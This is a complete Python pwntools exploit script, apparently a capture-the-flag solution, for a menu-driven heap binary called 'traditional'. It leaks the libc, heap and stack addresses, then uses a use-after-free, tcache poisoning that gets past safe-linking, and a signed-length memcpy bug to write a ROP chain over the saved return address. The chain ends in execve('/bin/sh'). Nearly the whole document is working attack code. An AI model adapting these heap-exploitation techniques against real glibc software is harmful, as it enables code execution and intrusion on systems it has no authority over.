#!/usr/bin/env python3
from pwn import *
import base64
import os
import time

context.arch = "amd64"
context.log_level = "debug" if args.DEBUG else "info"
context.terminal = ["cmd.exe", "/c", "start", "cmd.exe", "/k", "wsl.exe", "bash", "-lc"]

STD = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
CUSTOM = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
ENC_TRANS = bytes.maketrans(STD, CUSTOM)

MAIN_ARENA_LEAK_OFF = 0x233C20
UAF_CHUNK_OFF = 0xF20
FINAL_VICTIM_FROM_UAF = 0x460
SAVED_RBP_FROM_ENVIRON = 0x148


def b64(x):
    if isinstance(x, int):
        x = str(x).encode()
    elif isinstance(x, str):
        x = x.encode()
    return base64.b64encode(x).translate(ENC_TRANS)


def protect(pos, ptr):
    return ptr ^ (pos >> 12)


here = os.path.dirname(os.path.abspath(__file__))
os.chdir(here)

elf = context.binary = ELF("./traditional", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

rop = ROP(libc)
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
POP_RSI = rop.find_gadget(["pop rsi", "ret"]).address
POP_RDX = rop.find_gadget(["pop rdx", "ret"]).address
RET = rop.find_gadget(["ret"]).address
BIN_SH = next(libc.search(b"/bin/sh\x00"))

io = process("./traditional")
if args.GDB:
    gdb.attach(io)
    pause()


def cmd(choice, *values):
    io.sendlineafter(b"choice: ", b64(choice))
    for value in values:
        io.sendline(b64(value))


def add(size, idx):
    cmd(1, size, idx)


def edit(idx, content):
    cmd(2, idx, content)


def show(idx):
    cmd(3, idx)
    return io.recvuntil(b"[DONE] handle_show", drop=True)


def delete(idx):
    cmd(4, idx)


def copy_chunk(src, dst, length):
    cmd(7, src, dst, length)


def quit_menu():
    cmd(5)


# Stage 1: leak libc from a freed 0x110 chunk, and leak heap from tcache fd.
for i in range(8):
    add(0x100, i)

for i in range(1, 8):
    delete(i)
delete(0)

for i in range(1, 8):
    add(0x100, i)
add(0x100, 0)

libc_leak = u64(show(0)[:6].ljust(8, b"\x00"))
libc.address = libc_leak - MAIN_ARENA_LEAK_OFF
log.success(f"libc base = {libc.address:#x}")

heap = u64(show(7)[:5].ljust(8, b"\x00")) << 12
log.success(f"heap base = {heap:#x}")

# Stage 2: use the delete-shift bug once.
# delete(0x80 | 14) shifts idx15 into idx14 but leaves idx15 unchanged.
# delete(14) then frees the same chunk while idx15 still points to it.
add(0x380, 14)
add(0x380, 15)
delete(0x80 | 14)
delete(14)

uaf_chunk = heap + UAF_CHUNK_OFF
old_fd = u64(show(15)[:8].ljust(8, b"\x00"))
expected_old_fd = protect(uaf_chunk, uaf_chunk - 0x390)
assert old_fd == expected_old_fd, "heap layout changed before UAF poisoning"
log.success(f"uaf chunk = {uaf_chunk:#x}")

# Poison 0x390 tcache to allocate at environ - 0x18.
edit(15, p64(protect(uaf_chunk, libc.sym.environ - 0x18)))
add(0x380, 14)
add(0x380, 13)

# show() behaves like a string output, so fill the 0x18 bytes before environ
# without adding a trailing NUL at environ itself.
edit(1, b"A" * 0x30)
copy_chunk(1, 13, 0x18)

stack = u64(show(13)[0x18:0x18 + 6].ljust(8, b"\x00"))
stack_target = stack - SAVED_RBP_FROM_ENVIRON
assert stack_target & 0xF == 0, "unexpected saved-rbp alignment"
log.success(f"stack leak = {stack:#x}")
log.success(f"saved rbp target = {stack_target:#x}")

# Stage 3: normal tcache poisoning again, but this time the freed fd is
# overwritten by the signed-length copy bug instead of a second UAF edit.
add(0xC0, 8)     # padding
add(0xA0, 9)     # victim: this freed chunk's fd will become stack_target
add(0x100, 10)   # dst for the negative-length copy primitive
add(0x100, 11)   # src for the negative-length copy primitive
add(0xA0, 12)    # helper in the same 0xb0 tcache bin

victim = uaf_chunk + FINAL_VICTIM_FROM_UAF
assert victim & 0xF == 0, "unexpected victim alignment"
log.success(f"final victim = {victim:#x}")

edit(10, b"B" * 0x60 + p64(protect(victim, stack_target)))
delete(12)
delete(9)

# 0xfffffff0 is checked as signed int -0x10, then used by memcpy as size_t.
# In this layout it moves the qword at idx10+0x60 into victim->fd.
copy_chunk(11, 10, 0xFFFF_FFF0)

add(0xA0, 9)
add(0xA0, 12)

# idx12 now points at saved rbp; saved rip is the next qword.
payload = p64(0) + flat(
    libc.address + RET,
    libc.address + POP_RDI,
    libc.address + BIN_SH,
    libc.address + POP_RSI,
    0,
    libc.address + POP_RDX,
    0,
    libc.sym.execve,
)

edit(12, payload)
quit_menu()

if args.CHECK:
    time.sleep(0.2)
    io.sendline(b"echo PWNED; exit")
    out = io.recvrepeat(2)
    print(out)
    if b"PWNED" not in out:
        raise SystemExit("CHECK failed: shell did not answer")
else:
    io.interactive()
